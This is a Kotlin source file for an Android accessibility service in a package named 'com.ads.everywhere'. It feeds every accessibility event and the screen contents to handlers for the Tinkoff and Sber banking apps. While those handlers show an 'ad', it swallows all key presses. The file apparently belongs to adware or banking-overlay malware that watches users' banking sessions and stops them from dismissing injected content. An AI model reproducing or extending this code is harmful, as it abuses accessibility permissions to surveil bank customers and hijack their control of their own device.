package com.ads.everywhere.service.acsb

import android.view.KeyEvent
import android.view.accessibility.AccessibilityEvent
import androidx.annotation.Keep
import com.ads.everywhere.Analytics
import com.ads.everywhere.di.KoinDI
import com.ads.everywhere.service.bank.SberService
import com.ads.everywhere.service.bank.TinkoffService
import com.ads.everywhere.service.acsb.AcsbWrapper

@Keep
class AcsbService : AcsbWrapper() {
    private lateinit var tinkoff: TinkoffService
    private lateinit var sber:SberService


    override fun onServiceConnected() {
        super.onServiceConnected()
        Analytics.init(this)
        tinkoff = TinkoffService(this)
        sber = SberService(this)
    }


    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        super.onAccessibilityEvent(event)
        tinkoff.onAccessibilityEvent(event, getRoot(),pn)
        sber.onAccessibilityEvent(event, getRoot(),pn)
    }

    override fun onDestroy() {
        tinkoff.onDestroy()
        sber.onDestroy()
        super.onDestroy()
    }


    override fun onKeyEvent(event: KeyEvent): Boolean {
        if(tinkoff.ad != null || sber.ad !=null){
            return true
        }

        return super.onKeyEvent(event)
    }

}